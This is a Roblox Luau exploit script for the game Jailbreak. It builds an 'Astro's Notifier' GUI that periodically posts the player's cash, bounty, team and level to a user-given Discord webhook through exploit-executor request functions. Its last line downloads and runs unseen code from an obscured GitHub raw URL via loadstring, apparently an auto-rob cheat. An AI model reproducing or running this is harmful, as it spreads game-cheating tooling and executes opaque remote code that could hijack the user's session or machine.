if game.PlaceId == 606849621 then -- Game execution check
  local ScreenGui = Instance.new("ScreenGui")
  local main = Instance.new("Frame")
  local topbar = Instance.new("Frame")
  local TextLabel = Instance.new("TextLabel")
  local HomeTab = Instance.new("Frame")
  local MainNotifierBtn = Instance.new("TextButton")
  local MainNotifierText = Instance.new("TextLabel")
  local webhook = Instance.new("TextBox")
  local TextButton = Instance.new("TextButton")
  local webhookTimer = Instance.new("TextBox")
  local TimerText = Instance.new("TextLabel")
  local CreditsButton = Instance.new("TextButton")
  local HomeButton = Instance.new("TextButton")
  local CreditsTab = Instance.new("Frame")
  local UIGridLayout = Instance.new("UIGridLayout")
  local TextLabel_2 = Instance.new("TextLabel")
  local TextLabel_3 = Instance.new("TextLabel")
  local TextLabel_4 = Instance.new("TextLabel")
  local UpdatesButton = Instance.new("TextButton")
  local UpdatesTab = Instance.new("Frame")
  local TextLabel_5 = Instance.new("TextLabel")
  local TextLabel_6 = Instance.new("TextLabel")
  local TextLabel_7 = Instance.new("TextLabel")
  local close = Instance.new("ImageButton")
  local function bountytext()
      local bountytext = (game:GetService("Players").LocalPlayer.PlayerGui.AppUI.Buttons.Bounty.Label.Text)
      return bountytext
  end
  local function currentcash()
      local currentcash = (game:GetService("Players").LocalPlayer.PlayerGui.CashGui.Container.Content.ContainerTop.ContainerRight.ContainerCash.TextLabel.Text)
      return currentcash
  end
  local function currentTeam()
      local currentTeam = tostring((game:GetService("Players").LocalPlayer.Team))
      return currentTeam
  end
  local function currentlevel()
      local currentlevel = (game:GetService("Players").LocalPlayer.Level.Value)
      return currentlevel
  end
  local function currentexp()
      local currentexp = (game:GetService("Players").LocalPlayer.Exp.Value)
      return currentexp
  end
  local function localplayername()
      local localplayername = (game:GetService("Players").LocalPlayer.Name)
      return localplayername
  end
   
  ScreenGui.Parent = game.CoreGui
  ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  
  main.Name = "main"
  main.Parent = ScreenGui
  main.BackgroundColor3 = Color3.new(0.168627, 0.168627, 0.168627)
  main.BorderSizePixel = 0
  main.Position = UDim2.new(0.178270847, 0, 0.539753556, 0)
  main.Size = UDim2.new(0, 266, 0, 165)
  main.Active = true
  main.Draggable = true
  
  topbar.Name = "topbar"
  topbar.Parent = main
  topbar.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
  topbar.BorderSizePixel = 0
  topbar.Size = UDim2.new(0, 266, 0, 25)
  
  TextLabel.Parent = topbar
  TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel.BackgroundTransparency = 1
  TextLabel.Size = UDim2.new(0, 266, 0, 25)
  TextLabel.Font = Enum.Font.GothamMedium
  TextLabel.Text = "Astro's Notifier"
  TextLabel.TextColor3 = Color3.new(1, 1, 1)
  TextLabel.TextSize = 20
  TextLabel.TextWrapped = true
  
  HomeTab.Name = "HomeTab"
  HomeTab.Parent = main
  HomeTab.BackgroundColor3 = Color3.new(0.168627, 0.168627, 0.168627)
  HomeTab.BorderSizePixel = 0
  HomeTab.Position = UDim2.new(0, 0, 0.290909082, 0)
  HomeTab.Size = UDim2.new(0, 266, 0, 117)
  HomeTab.Visible = false
  
  MainNotifierBtn.Name = "MainNotifierBtn"
  MainNotifierBtn.Parent = HomeTab
  MainNotifierBtn.BackgroundColor3 = Color3.new(0.509804, 0.509804, 0.509804)
  MainNotifierBtn.BorderSizePixel = 0
  MainNotifierBtn.Position = UDim2.new(0.0263157897, 0, 0.0644468069, 0)
  MainNotifierBtn.Size = UDim2.new(0, 20, 0, 20)
  MainNotifierBtn.Font = Enum.Font.SourceSans
  MainNotifierBtn.Text = ""
  MainNotifierBtn.TextColor3 = Color3.new(0, 0, 0)
  MainNotifierBtn.TextSize = 14
  _G.sendhook = false
  local mainnotiferbool = false
  MainNotifierBtn.MouseButton1Click:Connect(
      function()
          if mainnotiferbool == false then
              mainnotiferbool = true
              _G.sendhook = true
              MainNotifierBtn.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
              local webhookUrl
              webhookUrl = webhook.Text
              local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
              while _G.sendhook do
                  print("Attempting to send webhook.")
                  request(
                      {
                          Url = webhookUrl,
                          Body = game:GetService("HttpService"):JSONEncode(
                          {
                              content = "",
                              embeds = {
                                  {
                                      title = "Jailbreak Auto-Rob Notifier.",
                                      description = "Current logged in user: `" .. localplayername() .. "`",
                                      fields = {
                                          {
                                              name = "`💸` Current Cash",
                                              value = "```" .. currentcash() .. "```",
                                              inline = true
                                          },
                                          {
                                              name = "`💢` Current Bounty",
                                              value = "```" .. string.sub(bountytext(), 9) .. "```",
                                              inline = true
                                          },
                                          {
                                              name = "`🎭` Current Team",
                                              value = "```" .. currentTeam() .. "```",
                                              inline = true
                                          },
                                          {
                                              name = "`🆙` Current Level & EXP",
                                              value = "```" .. currentlevel() .. " (" .. currentexp() .. ")```",
                                              inline = true
                                          }
                                      },
                                      url = "https://www.roblox.com/games/606849621/Jailbreak",
                                      color = nil
                                  }
                              }
                          }
                          ),
                          Method = "POST",
                          Headers = {
                              ["content-type"] = "application/json"
                          }
                      }
                  )
                  require(game:GetService("ReplicatedStorage").Game.Notification).new(
                  {
                      Text = "Sent Webhook, check your discord!\nBlind#2665, fayy#9999 & HKPlays#4587",
                      Duration = 5
                  }
                  )
                  print("Sent Successfully.")
                  task.wait(webhookTimer.Text)
              end
          else
              MainNotifierBtn.BackgroundColor3 = Color3.fromRGB(130, 130, 130)
              mainnotiferbool = false
              _G.sendhook = false
          end
      end
  )
  
  MainNotifierText.Name = "MainNotifierText"
  MainNotifierText.Parent = HomeTab
  MainNotifierText.BackgroundColor3 = Color3.new(1, 1, 1)
  MainNotifierText.BackgroundTransparency = 1
  MainNotifierText.Position = UDim2.new(0.139097735, 0, 0.0644468069, 0)
  MainNotifierText.Size = UDim2.new(0, 121, 0, 20)
  MainNotifierText.Font = Enum.Font.GothamMedium
  MainNotifierText.Text = "Main Notifier"
  MainNotifierText.TextColor3 = Color3.new(1, 1, 1)
  MainNotifierText.TextSize = 14
  MainNotifierText.TextXAlignment = Enum.TextXAlignment.Left
  
  webhook.Name = "webhook"
  webhook.Parent = HomeTab
  webhook.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
  webhook.BorderSizePixel = 0
  webhook.Position = UDim2.new(0.0259999447, 0, 0.765812039, 0)
  webhook.Size = UDim2.new(0, 197, 0, 21)
  webhook.Font = Enum.Font.GothamMedium
  webhook.PlaceholderColor3 = Color3.new(0.835294, 0.835294, 0.835294)
  webhook.PlaceholderText = "Webhook URL here"
  webhook.Text = ""
  webhook.TextColor3 = Color3.new(1, 1, 1)
  webhook.TextSize = 12
  
  TextButton.Parent = HomeTab
  TextButton.BackgroundColor3 = Color3.new(0.137255, 0.4, 0.721569)
  TextButton.BorderSizePixel = 0
  TextButton.Position = UDim2.new(0.789473593, 0, 0.765812039, 0)
  TextButton.Size = UDim2.new(0, 49, 0, 21)
  TextButton.Font = Enum.Font.GothamMedium
  TextButton.Text = "Test"
  TextButton.TextColor3 = Color3.new(1, 1, 1)
  TextButton.TextSize = 14
  TextButton.MouseButton1Click:Connect(
      function()
          print("Testing webhook")
          local webhookUrl
          webhookUrl = webhook.Text
          local request = http_request or request or HttpPost or (syn and syn.request) or (http and http.request)
          request(
              {
                  Url = webhookUrl,
                  Body = game:GetService("HttpService"):JSONEncode(
                  {
                      content = "Your webhook is working! :smile:"
                  }
                  ),
                  Method = "POST",
                  Headers = {
                      ["content-type"] = "application/json"
                  }
              }
          )
          webhook.TextWrapped = true
          TextButton.Text = "Sent!"
          print("Tested.")
          task.wait(3)
          TextButton.Text = "Test"
      end
  )
  
  webhookTimer.Name = "webhookTimer"
  webhookTimer.Parent = HomeTab
  webhookTimer.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
  webhookTimer.BorderSizePixel = 0
  webhookTimer.Position = UDim2.new(0.0259999447, 0, 0.28717953, 0)
  webhookTimer.Size = UDim2.new(0, 57, 0, 21)
  webhookTimer.Font = Enum.Font.GothamMedium
  webhookTimer.PlaceholderColor3 = Color3.new(0.835294, 0.835294, 0.835294)
  webhookTimer.PlaceholderText = "900"
  webhookTimer.Text = ""
  webhookTimer.TextColor3 = Color3.new(1, 1, 1)
  webhookTimer.TextSize = 12
  
  TimerText.Name = "TimerText"
  TimerText.Parent = HomeTab
  TimerText.BackgroundColor3 = Color3.new(1, 1, 1)
  TimerText.BackgroundTransparency = 1
  TimerText.Position = UDim2.new(0.277879655, 0, 0.28717953, 0)
  TimerText.Size = UDim2.new(0, 129, 0, 21)
  TimerText.Font = Enum.Font.GothamMedium
  TimerText.Text = "Webhook Timer (Seconds)"
  TimerText.TextColor3 = Color3.new(1, 1, 1)
  TimerText.TextSize = 14
  TimerText.TextXAlignment = Enum.TextXAlignment.Left
  
  CreditsButton.Name = "CreditsButton"
  CreditsButton.Parent = main
  CreditsButton.BackgroundColor3 = Color3.new(0.137255, 0.4, 0.721569)
  CreditsButton.BorderSizePixel = 0
  CreditsButton.Position = UDim2.new(0.34429267, 0, 0.187878788, 0)
  CreditsButton.Size = UDim2.new(0, 81, 0, 17)
  CreditsButton.Font = Enum.Font.GothamMedium
  CreditsButton.Text = "Credits"
  CreditsButton.TextColor3 = Color3.new(1, 1, 1)
  CreditsButton.TextSize = 14
  CreditsButton.MouseButton1Click:Connect(
      function()
          print("Switched to Credits Tab.")
          HomeTab.Visible = false
          CreditsTab.Visible = true
          UpdatesTab.Visible = false
      end
  )
  
  HomeButton.Name = "HomeButton"
  HomeButton.Parent = main
  HomeButton.BackgroundColor3 = Color3.new(0.137255, 0.4, 0.721569)
  HomeButton.BorderSizePixel = 0
  HomeButton.Position = UDim2.new(0.0263157897, 0, 0.187878788, 0)
  HomeButton.Size = UDim2.new(0, 77, 0, 17)
  HomeButton.Font = Enum.Font.GothamMedium
  HomeButton.Text = "Home"
  HomeButton.TextColor3 = Color3.new(1, 1, 1)
  HomeButton.TextSize = 14
  HomeButton.MouseButton1Click:Connect(
      function()
          print("Switched to Home Tab.")
          HomeTab.Visible = true
          CreditsTab.Visible = false
          UpdatesTab.Visible = false
      end
  )
  
  CreditsTab.Name = "CreditsTab"
  CreditsTab.Parent = main
  CreditsTab.BackgroundColor3 = Color3.new(0.168627, 0.168627, 0.168627)
  CreditsTab.BorderSizePixel = 0
  CreditsTab.Position = UDim2.new(0, 0, 0.290909082, 0)
  CreditsTab.Size = UDim2.new(0, 266, 0, 116)
  CreditsTab.Visible = false
  
  UIGridLayout.Parent = CreditsTab
  UIGridLayout.FillDirection = Enum.FillDirection.Vertical
  UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
  UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
  UIGridLayout.CellSize = UDim2.new(0, 266, 0, 25)
  
  TextLabel_2.Parent = CreditsTab
  TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_2.BackgroundTransparency = 0.75
  TextLabel_2.BorderSizePixel = 0
  TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
  TextLabel_2.Font = Enum.Font.GothamMedium
  TextLabel_2.Text = "Lead Dev : Blind#2665"
  TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_2.TextSize = 14
  
  TextLabel_3.Parent = CreditsTab
  TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_3.BackgroundTransparency = 0.75
  TextLabel_3.BorderSizePixel = 0
  TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
  TextLabel_3.Font = Enum.Font.GothamMedium
  TextLabel_3.Text = "Script Dev : HKPlays#4587"
  TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_3.TextSize = 14
  
  TextLabel_4.Parent = CreditsTab
  TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_4.BackgroundTransparency = 0.75
  TextLabel_4.BorderSizePixel = 0
  TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
  TextLabel_4.Font = Enum.Font.GothamMedium
  TextLabel_4.Text = "Base Dev : fayy#9999"
  TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_4.TextSize = 14
  
  UpdatesButton.Name = "UpdatesButton"
  UpdatesButton.Parent = main
  UpdatesButton.BackgroundColor3 = Color3.new(0.137255, 0.4, 0.721569)
  UpdatesButton.BorderSizePixel = 0
  UpdatesButton.Position = UDim2.new(0.673386216, 0, 0.187878788, 0)
  UpdatesButton.Size = UDim2.new(0, 79, 0, 17)
  UpdatesButton.Font = Enum.Font.GothamMedium
  UpdatesButton.Text = "Updates"
  UpdatesButton.TextColor3 = Color3.new(1, 1, 1)
  UpdatesButton.TextSize = 14
  UpdatesButton.MouseButton1Click:Connect(
      function()
          print("Switched to Updates Tab.")
          HomeTab.Visible = false
          CreditsTab.Visible = false
          UpdatesTab.Visible = true
      end
  )
  
  UpdatesTab.Name = "UpdatesTab"
  UpdatesTab.Parent = main
  UpdatesTab.BackgroundColor3 = Color3.new(0.168627, 0.168627, 0.168627)
  UpdatesTab.BorderSizePixel = 0
  UpdatesTab.Position = UDim2.new(0, 0, 0.291000009, 0)
  UpdatesTab.Size = UDim2.new(0, 266, 0, 117)
  
  TextLabel_5.Parent = UpdatesTab
  TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_5.BackgroundTransparency = 0.75
  TextLabel_5.BorderSizePixel = 0
  TextLabel_5.Position = UDim2.new(0.0225563906, 0, 0.0598290637, 0)
  TextLabel_5.Size = UDim2.new(0, 251, 0, 16)
  TextLabel_5.Font = Enum.Font.GothamMedium
  TextLabel_5.Text = "Update v1.0.3"
  TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_5.TextSize = 14
  
  TextLabel_6.Parent = UpdatesTab
  TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_6.BackgroundTransparency = 1
  TextLabel_6.BorderSizePixel = 0
  TextLabel_6.Position = UDim2.new(0.0225563906, 0, 0.222222239, 0)
  TextLabel_6.Size = UDim2.new(0, 251, 0, 16)
  TextLabel_6.Font = Enum.Font.GothamMedium
  TextLabel_6.Text = "• Changed UI Colors"
  TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_6.TextSize = 14
  TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
  
  TextLabel_7.Parent = UpdatesTab
  TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
  TextLabel_7.BackgroundTransparency = 1
  TextLabel_7.BorderSizePixel = 0
  TextLabel_7.Position = UDim2.new(0.0225563906, 0, 0.358974397, 0)
  TextLabel_7.Size = UDim2.new(0, 251, 0, 16)
  TextLabel_7.Font = Enum.Font.GothamMedium
  TextLabel_7.Text = "• Added Updates Tab"
  TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
  TextLabel_7.TextSize = 14
  TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
  
  close.Name = "close"
  close.Parent = main
  close.BackgroundTransparency = 1
  close.Position = UDim2.new(0.906015038, 0, -0.00303030014, 0)
  close.Size = UDim2.new(0, 25, 0, 25)
  close.ZIndex = 2
  close.Image = "rbxassetid://3926305904"
  close.ImageRectOffset = Vector2.new(284, 4)
  close.ImageRectSize = Vector2.new(24, 24)
  close.MouseButton1Click:Connect(function()
      main.Active = false
      main.Visible = false
      _G.sendhook = false
  end)
  
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ad08512fea03303cca3ddfcc2e96876c/60337215abfeb9d0ceebd6b41a4a26f3/main/475940a4460534bfadfc61665e62c56e.lua"))()
  else
    game.Players.LocalPlayer:Kick("Game check failed! Please execute on JAILBREAK! (606849621)")
  end
  
